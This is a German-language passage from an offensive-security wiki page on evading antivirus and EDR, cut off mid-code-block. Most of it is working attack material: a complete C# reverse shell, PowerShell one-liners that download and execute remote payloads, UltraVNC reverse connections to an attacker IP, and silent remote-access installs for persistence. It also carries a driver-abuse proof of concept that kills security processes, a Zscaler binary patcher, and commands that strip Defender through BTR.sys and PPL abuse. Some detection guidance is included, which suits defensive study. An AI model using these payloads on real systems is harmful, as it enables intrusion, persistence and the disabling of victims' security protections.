Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, bösartigen Code in anderen Sprachen auszuführen, indem man dem kompromittierten Rechner Zugriff **auf die Interpreter-Umgebung gewährt, die auf der vom Angreifer kontrollierten SMB-Freigabe installiert ist**.

Wenn du den Zugriff auf die Interpreter-Binärdateien und die Umgebung auf der SMB-Freigabe erlaubst, kannst du **beliebigen Code in diesen Sprachen im Arbeitsspeicher** des kompromittierten Rechners ausführen.

Dem Repo zufolge scannt Defender die Skripte weiterhin, aber durch den Einsatz von Go, Java, PHP usw. haben wir **mehr Flexibilität, statische Signaturen zu umgehen**. Tests mit zufälligen, nicht verschleierten Reverse-Shell-Skripten in diesen Sprachen waren erfolgreich.

## WebAssembly-Rehosting zur Umgehung statischer Analyse

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping manipuliert das Zugriffstoken eines Sicherheitsprodukts wie EDR oder AV. Wenn die Berechtigungen des Tokens herabgesetzt werden, kann der Prozess weiterlaufen, ohne privilegierte Inspektions- oder Behebungsaktionen ausführen zu können.

Um dies zu verhindern, könnte Windows **externen Prozessen** den Zugriff auf die Tokens von Sicherheitsprozessen verwehren.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Vertrauenswürdige Software verwenden

### Chrome Remote Desktop

Wie in [**diesem Blogbeitrag**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, lässt sich Chrome Remote Desktop einfach auf dem PC eines Opfers installieren und anschließend zur Übernahme und zur Aufrechterhaltung der Persistenz verwenden:<sup>[[35]](#references)</sup>
1. Lade die Software von https://remotedesktop.google.com/ herunter, klicke auf „Set up via SSH“ und anschließend auf die MSI-Datei für Windows, um sie herunterzuladen.
2. Führe das Installationsprogramm unbemerkt auf dem Rechner des Opfers aus (Administratorrechte erforderlich): `msiexec /i chromeremotedesktophost.msi /qn`
3. Kehre zur Chrome-Remote-Desktop-Seite zurück und klicke auf „Weiter“. Der Assistent fordert dich dann zur Autorisierung auf. Klicke auf die Schaltfläche „Autorisieren“, um fortzufahren.
4. Führe den bereitgestellten Befehl mit den erforderlichen Anpassungen aus: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (der Parameter `--pin` legt die PIN fest, ohne die GUI zu verwenden).
 

## Erweiterte Umgehungstechniken

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Umgehungstechniken sind ein sehr komplexes Thema. Manchmal müssen viele verschiedene Telemetriequellen auf einem einzigen System berücksichtigt werden, sodass es in ausgereiften Umgebungen nahezu unmöglich ist, völlig unentdeckt zu bleiben.

Jede Umgebung, gegen die du vorgehst, hat ihre eigenen Stärken und Schwächen.

Ich empfehle dir dringend, dir diesen Vortrag von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einstieg in fortgeschrittene Umgehungstechniken zu bekommen.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dies ist ein weiterer großartiger Vortrag von [@mariuszbit](https://twitter.com/mariuszbit) über Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Alte Techniken**

### **Prüfen, welche Teile Defender als bösartig erkennt**

Du kannst [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden. Das Tool **entfernt Teile der Binärdatei**, bis es **herausfindet, welcher Teil von Defender** als bösartig erkannt wird, und gibt diesen Teil separat aus.\
Ein weiteres Tool, das **dasselbe tut, ist** [**avred**](https://github.com/dobin/avred), das den Dienst auch über eine offene Weboberfläche unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) anbietet.

### **Telnet-Server**

Bis einschließlich Windows 10 enthielten alle Windows-Versionen einen **Telnet-Server**, den du (als Administrator) wie folgt installieren konntest:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Lass es beim Systemstart starten und führe es jetzt aus:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Telnet-Port ändern** (Stealth) und Firewall deaktivieren:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Lade es hier herunter: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (du benötigst die bin-Downloads, nicht das Setup)

**AUF DEM HOST**: Führe _**winvnc.exe**_ aus und konfiguriere den Server:

- Aktiviere die Option _Disable TrayIcon_
- Lege unter _VNC Password_ ein Passwort fest
- Lege unter _View-Only Password_ ein Passwort fest

Verschiebe anschließend die Binärdatei _**winvnc.exe**_ und die **neu** erstellte Datei _**UltraVNC.ini**_ auf den **Victim**

#### **Reverse connection**

Der **Attacker** sollte auf seinem **Host** die Binärdatei `vncviewer.exe -listen 5900` **ausführen**, damit sie bereit ist, eine reverse **VNC connection** anzunehmen. Starte dann auf dem **Victim** den winvnc-Daemon mit `winvnc.exe -run` und führe `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` aus.

**WARNUNG:** Um unauffällig zu bleiben, solltest du Folgendes vermeiden:

- Starte `winvnc` nicht, wenn es bereits läuft, sonst wird ein [Popup](https://i.imgur.com/1SROTTl.png) ausgelöst. Prüfe mit `tasklist | findstr winvnc`, ob es läuft.
- Starte `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, sonst wird [das Konfigurationsfenster](https://i.imgur.com/rfMQWcf.png) geöffnet.
- Führe `winvnc -h` nicht aus, um die Hilfe aufzurufen, sonst wird ein [Popup](https://i.imgur.com/oc18wcu.png) ausgelöst.

### GreatSCT

Lade es hier herunter: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

In GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Starten Sie nun **den Listener** mit `msfconsole -r file.rc` und **führen Sie** die **XML-Payload** aus mit:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Der aktuelle Defender wird den Prozess sehr schnell beenden.**

### Unsere eigene reverse shell kompilieren

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C# Revershell

Kompiliere sie mit:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Verwenden Sie es mit:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# mit Compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste der C#-Obfuscatoren: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Beispiel: Injector mit Python erstellen

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Andere Tools

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Mehr

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR aus dem Kernel-Space ausschalten

Storm-2603 nutzte ein kleines Konsolendienstprogramm namens **Antivirus Terminator**, um den Endpoint-Schutz zu deaktivieren, bevor Ransomware abgelegt wurde. Das Tool bringt seinen **eigenen verwundbaren, aber *signierten* Treiber** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst AV-Dienste mit Protected-Process-Light (PPL) nicht blockieren können.<sup>[[12]](#references)</sup>

Wichtige Erkenntnisse
1. **Signierter Treiber**: Die auf dem Datenträger abgelegte Datei heißt `ServiceMouse.sys`, doch die Binärdatei ist der legitim signierte Treiber `AToolsKrnl64.sys` aus Antiy Labs’ „System In-Depth Analysis Toolkit“. Da der Treiber eine gültige Microsoft-Signatur trägt, wird er auch bei aktivierter Driver-Signature-Enforcement (DSE) geladen.
2. **Dienstinstallation**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Die erste Zeile registriert den Treiber als **kernel service**, und die zweite startet ihn, sodass `\\.\ServiceMouse` aus dem Userland zugänglich wird.
3. **Vom Treiber bereitgestellte IOCTLs**
   | IOCTL code | Fähigkeit                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Einen beliebigen Prozess anhand der PID beenden (wird verwendet, um Defender-/EDR-Dienste zu beenden) |
   | `0x990000D0` | Eine beliebige Datei auf der Festplatte löschen |
   | `0x990001D0` | Den Treiber entladen und den Dienst entfernen |

   Minimaler C-Proof-of-Concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Warum es funktioniert**: BYOVD umgeht User-Mode-Schutzmaßnahmen vollständig; im Kernel ausgeführter Code kann *geschützte* Prozesse öffnen, beenden oder Kernel-Objekte manipulieren – unabhängig von PPL/PP, ELAM oder anderen Hardening-Funktionen.

Erkennung / Gegenmaßnahmen
• Aktivieren Sie Microsofts Liste blockierter anfälliger Treiber (`HVCI`, `Smart App Control`), damit Windows das Laden von `AToolsKrnl64.sys` verweigert.
• Überwachen Sie die Erstellung neuer *Kernel*-Dienste und lösen Sie einen Alarm aus, wenn ein Treiber aus einem für alle beschreibbaren Verzeichnis geladen wird oder nicht auf der Allow-List steht.
• Achten Sie auf Handles aus dem User-Mode zu benutzerdefinierten Geräteobjekten, auf die verdächtige `DeviceIoControl`-Aufrufe folgen.

### Umgehung der Posture-Prüfungen von Zscaler Client Connector durch Binärdatei-Patching auf dem Datenträger

Zscaler’s **Client Connector** wendet Device-Posture-Regeln lokal an und verwendet Windows RPC, um die Ergebnisse an andere Komponenten zu übermitteln. Zwei schwache Designentscheidungen ermöglichen eine vollständige Umgehung:

1. Die Posture-Prüfung erfolgt **vollständig clientseitig** (ein boolescher Wert wird an den Server gesendet).
2. Interne RPC-Endpunkte prüfen lediglich, ob die verbindende ausführbare Datei **von Zscaler signiert** ist (über `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Durch **das Patchen von vier signierten Binärdateien auf dem Datenträger** lassen sich beide Mechanismen neutralisieren:

| Binärdatei | Gepatchte ursprüngliche Logik | Ergebnis |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jede Prüfung als konform gilt |
| `ZSAService.exe` | Indirekter Aufruf von `WinVerifyTrust` | NOP-ed ⇒ Jeder Prozess (auch ein unsignierter) kann sich mit den RPC-Pipes verbinden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Ersetzt durch `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integritätsprüfungen des Tunnels | Kurzgeschlossen |

Auszug aus einem minimalen Patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nach dem Ersetzen der Originaldateien und dem Neustart des Service-Stacks:

* **Alle** Posture-Prüfungen werden als **grün/konform** angezeigt.
* Nicht signierte oder veränderte Binärdateien können die benannten Pipe-RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das durch die Zscaler-Richtlinien definierte interne Netzwerk.

Diese Fallstudie zeigt, wie sich rein clientseitige Vertrauensentscheidungen und einfache Signaturprüfungen mit wenigen Byte-Patches umgehen lassen.

## Missbrauch vertrauenswürdiger Funktionalität von Microsoft Defender `BTR.sys`

Der **Boot-Time Removal**-Treiber von Defender ist ein nützliches Gegenbeispiel zu klassischem BYOVD. `BTR.sys` ist eine legitime, von Microsoft signierte Remediation-Komponente ohne Speicherbeschädigungsfehler und ohne IOCTL-Schnittstelle. Nach dem Erlangen von Administratorzugriff und `SeLoadDriverPrivilege` kann ein Operator stattdessen die private Remediation-Transaktion fälschen und die vorgesehenen Datei-/Registry-Operationen im Ring 0 ausführen. Dies ist ein **Primitiv zur Neutralisierung von AV/EDR nach einer Kompromittierung, kein Initial Access oder Privilege Escalation**. Außerdem lässt sich der Treiber aus der `BOOTTIMETOOL`-Ressource der `MpEngine.dll` des Ziels extrahieren, statt einen auffälligen Treiber eines Drittanbieters einzubinden.<sup>[[36]](#references)</sup>

### Bereitstellen des One-Shot-Treibers

Defender legt die Ressource normalerweise als Datei mit einem zufälligen Namen im Format `[a-z]{8}.sys` ab und registriert einen ähnlich benannten Kernel-Service. `DriverEntry` liest den Wert `Args` des Service, öffnet den referenzierten NTFS-ADS, entschlüsselt und validiert die Aktionsliste, schreibt Feedback und gibt nach erfolgreicher Ausführung `0xC0000056` (`STATUS_DELETE_PENDING`) zurück, sodass der Treiber entladen wird, statt resident zu bleiben. Ein gefälschter Service weist die folgenden charakteristischen Werte auf.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Der `:changelist`-Stream enthält einen RC4-verschlüsselten Blob. Die analysierten Builds verwenden denselben festen 256-Byte-Schlüssel, sodass die Verschlüsselung keine Autorisierungsgrenze darstellt. Ein gültiger Klartext hat einen 24-Byte-Global-Header (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, Header-CRC und eine aus der Payload abgeleitete Transaktions-ID), gefolgt von einem nullterminierten UTF-16-Feedbackpfad und beliebig vielen Elementen. Jedes Element hat einen 16-Byte-Header (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) sowie aktionsspezifische Daten, die mit **genau vier NUL-Bytes** enden. Jeder Header- und Datenbereich wird unabhängig mit CRC-32-Polynom `0xEDB88320`, dem Initialzustand `0xFFFFFFFF` und **ohne abschließendes XOR** (`~CRC32`) geprüft; der CRC-Zustand wird für jeden Bereich zurückgesetzt.<sup>[[36]](#references)[[37]](#references)</sup>

Die akzeptierten Aktions-IDs legen diese Kernel-Primitiven offen.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Elementdaten | Ergebnis |
| --- | --- | --- |
| 1 | `[UTF-16-Pfad]` | Datei löschen, auch wenn sie gesperrt ist |
| 2 | `[UTF-16-Pfad]` | Ein leeres Verzeichnis entfernen |
| 3 | `[Flags][Quelle][Ziel]` | Eine Datei in einen vom Angreifer ausgewählten geschützten Pfad verschieben; ein leeres Ziel bedeutet Löschen |
| 4 | `[Flags][Schlüsselpfad]` | Einen Registrierungsschlüssel rekursiv löschen |
| 5 | `[Flags][Schlüsselpfad + "\\" + Wert]` | Einen Registrierungswert löschen |
| 6 | `[Flags][Typ][Größe][Schlüsselpfad + "\\" + Wert][Daten]` | Einen Registrierungswert erstellen/aktualisieren und fehlende Schlüsselpfade erstellen |

Bei den Aktionen 5 und 6 ist das Trennzeichen zwischen Schlüssel und Wert auf dem Wire **ein Paar aufeinanderfolgender Backslashes**; ein konventionell formatierter Pfad wird nicht korrekt aufgeteilt. Die Feedbackdatei spiegelt größtenteils die Anfrage wider, aber die ersten vier Datenbytes jedes Elements werden zu dessen resultierendem `NTSTATUS`. Bei den Aktionen 1 und 2, die kein vorangestelltes Flags-Feld haben, verschiebt BTR den Pfad in die vier reservierten abschließenden Bytes, um Platz für diesen Status zu schaffen.<sup>[[36]](#references)</sup>

### `BTR_CLI`-Ablauf und Zeitfenster beim frühen Systemstart

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementiert die gesamte Kette: `BTR.sys` aus dem lokalen Defender extrahieren, `<random>.sys:changelist` und einen Feedback-Stream erstellen, verkettete Aktionen serialisieren, Prüfsummen berechnen und verschlüsseln, den Dienst-Registrierungsschlüssel direkt erstellen und anschließend `NtLoadDriver` für `-trigger now` aufrufen oder den Treiber für `-trigger boot` als Systemstarttreiber belassen. Das direkte Vorbereiten der Registrierung umgeht den normalen SCM-Pfad über `CreateServiceW` und erzeugt daher **kein** Dienstinstallationsereignis mit der Event-ID 7045. Artefakte eines boot-ausgelösten Starts können später mit `BTR_CLI.exe -cleanup <service_name>` entfernt werden.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` ist nicht verwendbar, da BTR bereits vor der Bereitschaft des Storage-Stacks und des `SystemRoot`-Links Datei-I/O aus `DriverEntry` ausführt. `Start=1` zusammen mit der Gruppe `Boot Bus Extender` mit hoher Priorität führt stattdessen in Phase 1 zur Ausführung: NTFS ist nutzbar, aber viele Security-Treiber mit Systemstart und EDR-Dienste im User-Mode wurden noch nicht initialisiert. Boot-Start-Filter wie `WdFilter` sind möglicherweise bereits geladen, doch BTR kann ihre Binärdateien oder Dienstkonfiguration vor dem nächsten Start entfernen und Dienst-Executables löschen, bevor SCM sie startet. ELAM schließt diese Lücke nicht, da BTR nach der Boot-Start-Auswertung ausgeführt wird und eine gültige Microsoft-Signatur besitzt.<sup>[[36]](#references)</sup>

Mehrere Aktionen werden in einer Transaktion ausgeführt. Der PoC stellt Action 1 für die fest codierte Datei `\SystemRoot\Temp\BootClean.log` voran: BTR erstellt dieses Log, verarbeitet dann seine eigene Löschanforderung und entfernt es vor dem Entladen. Das reduziert die Spuren, während Feedback in `<random>.sys:<random>.dat` die gemeinsame Entfernung des Treibers und beider Streams ermöglicht.<sup>[[36]](#references)[[37]](#references)</sup>

### Erkennung durch Korrelationen mit hoher Aussagekraft

Regeln, die nur auf Signaturen beruhen, und die Microsoft-Sperrliste für anfällige Treiber verhindern nicht den Missbrauch der vorgesehenen BTR-Funktionalität. Bevorzugt diese Verhaltenskorrelationen und unterscheidet dabei legitime Defender-Abstammung von einem beliebigen Launcher.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Die Erstellung von `.sys:changelist` ist bei der BTR-Bereitstellung universell. Ein `.dat`-ADS, der an dieselbe `.sys` angehängt ist, ist besonders verdächtig, da Defender Feedback normalerweise unter `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` ablegt.
- **Sysmon 12/13 ohne System 7045:** Korreliert die direkte Erstellung von `HKLM\SYSTEM\CurrentControlSet\Services\<random>` mit `Args=...:changelist` und `Group=Boot Bus Extender` mit einem fehlenden passenden SCM-Installationsereignis.
- **Sysmon 6 -> 23:** Korreliert das Laden eines bekannten BTR-Treibers ohne Defender-Abstammung mit einer anschließenden, `System`/PID 4 zugeordneten Dateilöschung, insbesondere bei Security-Binärdateien.
- **Sysmon 11 -> 23:** Löst einen Alarm aus, wenn `\SystemRoot\Temp\BootClean.log` schnell von `System`/PID 4 erstellt und gelöscht wird.
- Schränkt die Zuweisung und Aktivierung von `SeLoadDriverPrivilege` ein und überwacht sie; eine Microsoft-Signatur allein reicht nicht als Vertrauensnachweis, wenn ein Treiber eines Security-Tools von `cmd.exe`, PowerShell oder einem unbekannten Prozess bereitgestellt wird.

## Missbrauch von Protected Process Light (PPL), um AV/EDR mit LOLBINs zu manipulieren

Protected Process Light (PPL) setzt eine Hierarchie von Signierern und Schutzstufen durch, sodass nur gleichrangige oder höher geschützte Prozesse sich gegenseitig manipulieren können. Aus offensiver Sicht kannst du, wenn du eine PPL-fähige Binärdatei legitim starten und ihre Argumente kontrollieren kannst, gutartige Funktionalität (z. B. Logging) in eine eingeschränkte, durch PPL abgesicherte Schreibprimitive für geschützte Verzeichnisse von AV/EDR umwandeln.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Was einen Prozess als PPL ausführt
- Das Ziel-EXE (und alle geladenen DLLs) muss mit einem PPL-fähigen EKU signiert sein.
- Der Prozess muss mit `CreateProcess` und den Flags `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` erstellt werden.
- Es muss eine kompatible Schutzstufe angefordert werden, die dem Signierer der Binärdatei entspricht (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für Anti-Malware-Signierer, `PROTECTION_LEVEL_WINDOWS` für Windows-Signierer). Falsche Stufen führen dazu, dass die Erstellung fehlschlägt.

Eine umfassendere Einführung in PP/PPL und den LSASS-Schutz findest du hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-Tools
- Open-Source-Hilfsprogramm: CreateProcessAsPPL (wählt die Schutzstufe aus und leitet Argumente an das Ziel-EXE weiter):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Verwendungsmuster:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN-Primitive: ClipUp.exe
- Die signierte Systemdatei `C:\Windows\System32\ClipUp.exe` startet sich selbst und akzeptiert einen Parameter, um eine Protokolldatei in einem vom Aufrufer angegebenen Pfad zu schreiben.
- Wird sie als PPL-Prozess gestartet, erfolgt der Schreibvorgang mit PPL-Unterstützung.
- ClipUp kann keine Pfade mit Leerzeichen verarbeiten; verwende 8.3-Kurzpfade, um auf normalerweise geschützte Speicherorte zu verweisen.

8.3-Kurzpfad-Hilfen
- Kurznamen auflisten: `dir /x` in jedem übergeordneten Verzeichnis.
- Kurzpfad in cmd ableiten: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Missbrauchskette (abstrakt)
1) Starte das PPL-fähige LOLBIN (ClipUp) mit `CREATE_PROTECTED_PROCESS` über einen Launcher (z. B. CreateProcessAsPPL).
2) Übergib das ClipUp-Argument für den Protokollpfad, um eine Datei in einem geschützten AV-Verzeichnis (z. B. Defender Platform) erstellen zu lassen. Verwende bei Bedarf 8.3-Kurznamen.
3) Wenn die Zieldatei normalerweise während des Betriebs vom AV geöffnet bzw. gesperrt ist (z. B. MsMpEng.exe), plane den Schreibvorgang beim Systemstart, bevor der AV gestartet wird, indem du einen Autostartdienst installierst, der zuverlässig früher ausgeführt wird. Überprüfe die Startreihenfolge mit Process Monitor (Boot-Protokollierung).
4) Beim Neustart erfolgt der PPL-gestützte Schreibvorgang, bevor der AV seine Binärdateien sperrt. Dadurch wird die Zieldatei beschädigt und der Start verhindert.

Beispielaufruf (Pfade aus Sicherheitsgründen entfernt oder gekürzt):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
